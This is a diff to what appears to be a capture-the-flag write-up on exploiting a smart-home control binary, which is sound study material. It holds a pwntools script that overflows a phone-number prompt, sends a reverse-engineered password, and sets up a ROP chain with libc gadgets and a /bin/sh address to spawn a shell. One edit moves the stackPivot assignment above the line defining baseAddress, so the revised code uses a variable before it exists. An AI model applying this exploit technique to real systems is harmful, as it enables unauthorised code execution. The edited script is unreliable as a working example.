@@ -269,10 +269,10 @@ void printAlarmPassword()
 
 
 ## Exploitation
-When I first ran the program I noticed there was an error that stated "Warning fridge circuit overloaded,
+When I first ran the program I noticed there was an error stating "Warning fridge circuit overloaded,
 Some devices may refuse to turn on". We will start by turning the fridge circuit off so we can interact with the other devices.
 
-Lets begin the exploitation phase, I began by targetting the "Issue 1" (Fire Alarm) as discussed in our source code analysis. 
+Lets begin the exploitation phase, I began by targeting the "Issue 4" (Fire Alarm) as discussed in our source code analysis. 
 
 When prompted to enter a phone number to call, I sent in two extra bytes to modify the ```fire.alarm``` function.
 
@@ -589,6 +589,7 @@ p.sendline('4')
 p.readuntil('Press TEST? [Y/n]')
 p.sendline('Y')
 p.readuntil('Enter phone number to test:')
+# OVERFLOW
 p.sendline('1234567\x18\x05')
 p.readuntil('Enter Choice:')
 p.sendline('2')
@@ -599,6 +600,7 @@ p.sendline('370')
 p.readuntil('Enter Choice:')
 p.sendline('3')
 p.readuntil('{PASSWORD REQUIRED TO CONTINUE}')
+# REVERSE ENGINEERED PASSWORD
 p.sendline(b'\x05\x05\x29\x72\x69\x71\x76\x79\x52\x45\x35\x07')
 p.readuntil('?')
 p.sendline('0')
@@ -652,23 +654,22 @@ p.sendline(manageAlarmAddress)
 p.readuntil('Enter Choice:')
 p.sendline('4')
 
-
+# ROP CHAIN START
+# Slide rsp foward:  add rsp, 0x28 ; ret
+stackPivot = baseAddress + 0x34ad2
 baseAddress = currentPassword - 0x3a030
 
 binShAddress = baseAddress + 0x18cd57
 
 popRdiAddress = baseAddress + 0x000000021102
 
-leaveRet = baseAddress + 0x42351
-
 popRaxAddress = baseAddress + 0x33544
 popRsiAddress = baseAddress + 0x202e8
 popRdxAddress = baseAddress + 0x1b92
 
 syscallAddress = baseAddress + 0xbc375
+# ROP CHAIN END
 
-# #0x28
-stackPivot = baseAddress + 0x34ad2
 
 p.readuntil("ENTER ALARM PASSWORD TO CONTINUE:")
 p.sendline(str(currentPassword))
@@ -677,6 +678,7 @@ p.sendline('1')
 p.readuntil("Enter choice:")
 p.sendline('3')
 
+# GET ADDRESS LEAK
 indexTen = str(hex(stackPivot))[-8:]
 indexEleven = str(hex(stackPivot))[2:6]
 
